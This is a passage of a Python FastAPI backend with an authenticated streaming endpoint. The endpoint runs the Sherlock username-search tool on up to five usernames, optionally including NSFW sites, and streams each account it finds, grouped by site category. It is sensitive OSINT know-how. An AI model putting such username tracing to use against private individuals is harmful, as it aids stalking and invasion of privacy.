    if any(s in n for s in ["anilist","myanimelist","kitsu","trakt","letterboxd","imdb","goodreads","librarything","rateyour","tvtime","simkl"]): return "entertainment"
    return "other"


# ── Sherlock SSE Streaming ────────────────────────────────────
from fastapi.responses import StreamingResponse as _StreamResp
import json as _json_stream

@router.get("/sherlock/stream")
async def sherlock_stream(
    usernames: str,
    timeout: int = 60,
    nsfw: bool = False,
    token: str = "",
    db: AsyncSession = Depends(get_db),
):
    # Authenticate via query param token for SSE (EventSource cant set headers)
    from app.core.security import decode_token
    from app.db.models import User as _User
    from sqlalchemy import select as _select
    payload = decode_token(token)
    if not payload:
        from fastapi import HTTPException
        raise HTTPException(status_code=401, detail="Invalid token")
    user_id = payload.get("sub")
    result = await db.execute(_select(_User).where(_User.id == user_id))
    current_user = result.scalar_one_or_none()
    if not current_user:
        from fastapi import HTTPException
        raise HTTPException(status_code=401, detail="User not found")
    import asyncio as aio

    uList = [u.strip() for u in usernames.replace(',', '\n').splitlines() if u.strip()][:5]

    async def generate():
        cmd = [
            "python3", "-m", "sherlock_project",
            "--timeout", str(min(timeout, 120)),
            "--print-found",
            "--no-color",
        ]
        if nsfw:
            cmd += ["--nsfw"]
        cmd += uList

        yield f"data: {_json_stream.dumps({'type':'start','usernames':uList})}\n\n"

        try:
            proc = await aio.create_subprocess_exec(
                *cmd,
                stdout=aio.subprocess.PIPE,
                stderr=aio.subprocess.PIPE,
            )

            current_username = None
            counts = {u: 0 for u in uList}

            while True:
                line = await aio.wait_for(proc.stdout.readline(), timeout=timeout + 10)
                if not line:
                    break
                line = line.decode('utf-8', errors='replace').strip()
                if not line:
                    continue

                if "[*] Checking username" in line:
                    for u in uList:
                        if u in line:
                            current_username = u
                            yield f"data: {_json_stream.dumps({'type':'checking','username':u})}\n\n"
                            break

                elif line.startswith("[+]") and current_username:
                    parts = line[3:].strip().split(": ", 1)
                    if len(parts) == 2:
                        site_name = parts[0].strip()
                        url = parts[1].strip()
                        category = _cat_site(site_name)
                        counts[current_username] += 1
                        yield f"data: {_json_stream.dumps({'type':'found','username':current_username,'site':site_name,'url':url,'category':category,'count':counts[current_username]})}\n\n"

            await proc.wait()
            yield f"data: {_json_stream.dumps({'type':'complete','counts':counts})}\n\n"

        except aio.TimeoutError:
            yield f"data: {_json_stream.dumps({'type':'error','message':'Timeout'})}\n\n"
        except Exception as e:
            yield f"data: {_json_stream.dumps({'type':'error','message':str(e)})}\n\n"

    return _StreamResp(
        generate(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        }
    )
